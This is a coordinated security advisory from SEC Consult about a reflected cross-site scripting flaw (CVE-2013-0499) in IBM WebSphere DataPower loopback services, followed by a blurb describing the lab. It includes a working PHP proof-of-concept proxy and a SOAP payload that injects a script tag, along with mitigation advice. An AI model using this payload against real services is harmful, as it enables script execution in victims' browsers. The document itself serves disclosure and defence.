SEC Consult Vulnerability Lab Security Advisory < 20130523-0 >
=======================================================================
              title: JavaScript Execution in WebSphere DataPower Services
            product: IBM WebSphere DataPower Integration Appliance XI50
 vulnerable version: 3.8.2, 4.0, 4.0.1, 4.0.2, 5.0.0
      fixed version: not available, config changes
         CVE number: CVE-2013-0499
             impact: Low/Medium
           homepage: <https://www.ibm.com/>
              found: 2013-01-28

=======================================================================

Vendor/product description:
-----------------------------
WebSphere® DataPower® appliances simplify, govern, and optimize the delivery
of services and applications and enhance the security of XML and IT services.
They extend the capabilities of an infrastructure by providing a multitude of
functions.
URL: <http://www-03.ibm.com/software/products/us/en/datapower/>

Vulnerability overview/description:
-----------------------------------
For the purposes of debugging, DataPower provides configuration options to
echo requests received from the client. For example, XML Firewall service can
be configured to echo requests by choosing the backend as 'loopback'. Other
services like Multi Protocol Gateway and Web Service Proxy can be configured
to echo requests by setting the variable “var://service/mpgw/skip-backside” in
its processing policy.
In such configurations, the requests are not sent to a backend server. Without
adequate validation and processing, the requests may be echoed back to the
client. Loopback services that blindly echo requests should only be used for
debugging purposes and not intended to be run in production environments as
they can result in potential security threats. For example, if an arbitrary
JavaScript embedded request is sent to such services, they will simply echo it
back resulting in a potential JavaScript execution vulnerability in the
client's browser.
URL: <https://www-304.ibm.com/support/docview.wss?uid=swg21637717>

Proof of concept:
-----------------
The proof of concept was tested on an IBM Xi50 with the backend configured as
a "loopback" Web Service. The "loopback" Web Service can be used to execute
arbitrary JavaSscript code in a victims browser. Any valid SOAP message sent
to the Web service is returned unmodified to the receiver. If the SOAP
response of the "loopback" Web Service is parsed by a browser, any JavaScript
that is contained within the XML document will get executed.
The following PHP script demonstrates a reflected cross site scripting.

<?php
$soapEndpoint = "<http://127.0.0.1:80">;;
$soapMessage =
'<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="[http://schemas.xmlsoap.org/soap/envelope/"](http://schemas.xmlsoap.org/soap/envelope/%22);
xmlns:sam="<http://sample02.policy.samples.rampart.apache.org">;>
   <soapenv:Header/>
   <soapenv:Body>
      <sam:echo>
        <html:html xmlns:html="[http://www.w3.org/1999/xhtml"](http://www.w3.org/1999/xhtml%22);>
            <html:script>alert("XML XSS");</html:script>
        </html:html>
      </sam:echo>
   </soapenv:Body>
</soapenv:Envelope>';

if(isset($_POST['soapMessage']) and isset($_POST['soapUrl'])){
$soap_do = curl_init();
        curl_setopt($soap_do, CURLOPT_URL,            $_POST['soapUrl'] );
        curl_setopt($soap_do, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($soap_do, CURLOPT_TIMEOUT,        10);
        curl_setopt($soap_do, CURLOPT_RETURNTRANSFER, true );
        curl_setopt($soap_do, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($soap_do, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($soap_do, CURLOPT_POST,           true );
        curl_setopt($soap_do, CURLOPT_POSTFIELDS,    $_POST['soapMessage']);
        curl_setopt($soap_do, CURLOPT_HTTPHEADER,     array('Content-Type: text/xml; charset=utf-8', 'Content-Length:
'.strlen($_POST['soapMessage']) ));

        $result = curl_exec($soap_do);
        $err = curl_error($soap_do);

        header('Content-type: text/xml');
        echo $result;
        exit;
}
?>

<html>
    <body>
        <h1>XSS XML Proxy</h1>
        <form name="input" action="" method="post">
        SOAP Endpoint: <input type="text" name="soapUrl" value="<?php echo $soapEndpoint; ?>"><br />
        SOAP Message:&nbsp; <textarea cols="70" name="soapMessage" rows="14"><?php echo $soapMessage; ?></textarea><br
/>
        <br />
        <input type="submit" value="Submit">
        </form>
    </body>
</html>

Vulnerable / tested versions:
-----------------------------
SEC Consult verified the vulnerability in the WebSphere DataPower Appliance XI50.
The vendor provided an extended list of vulnerable versions:
WebSphere DataPower 3.8.2, 4.0, 4.0.1, 4.0.2, 5.0.0.

Vendor contact timeline:
------------------------
2013-01-30: Sending advisory and proof of concept exploit via encrypted channel.
2013-01-31: Vendor confirms receipt
2013-05-17: Vendor posts security bulletin
2013-05-23: SEC Consult releases coordinated security advisory.

Solution:
---------
The vendor does not offer a patch.

The vulnerability can be prevented by disabling the services to blindly echo
requests back. A detailed description can be found on the vendor's site:
<https://www-304.ibm.com/support/docview.wss?uid=swg21637717>

# Vulnerability Lab

With the **Vulnerability Lab**, SEC Consult **operates its own internal security laboratory**, in order to ensure an international know-how advantage over attackers in the areas of network and application security. In addition, this facility serves the support with high-quality penetration tests and with the evaluation of new technologies and is at the service of our customers. Thus, they receive the latest information about security gaps and valid statements about the risk profile of new technologies.

Our Vulnerability Lab follows a [Responsible Disclosure Policy](/vulnerability-lab/responsible-disclosure-policy/) which aims to provide vendors with the necessary information and timeframe needed to validate and fix a security flaw in order to mutually coordinate the public release of a security advisory as part of our responsible disclosure process. This document also clarifies the extent and limitation of effort the SEC Consult Vulnerability Lab will invest. It can be found [here](/vulnerability-lab/responsible-disclosure-policy/).

Here you find all our **[studies and whitepapers](/vulnerability-lab/studies-and-whitepapers/)**.

You can reach our Vulnerability Lab through security-research(at)sec-consult.com. The PGP key with fingerprint F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F can be downloaded [here](https://keys.openpgp.org/vks/v1/by-fingerprint/F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F).

The SEC Consult Vulnerability Lab is also an official [CNA](https://www.cve.org/PartnerInformation/ListofPartners/partner/SEC-VLab) (CVE Numbering Authority) and our scope for assigning CVE numbers is all vulnerabilities discovered in third-party hardware/software by the SEC Consult Vulnerability Lab, which are not in another CNA's scope.
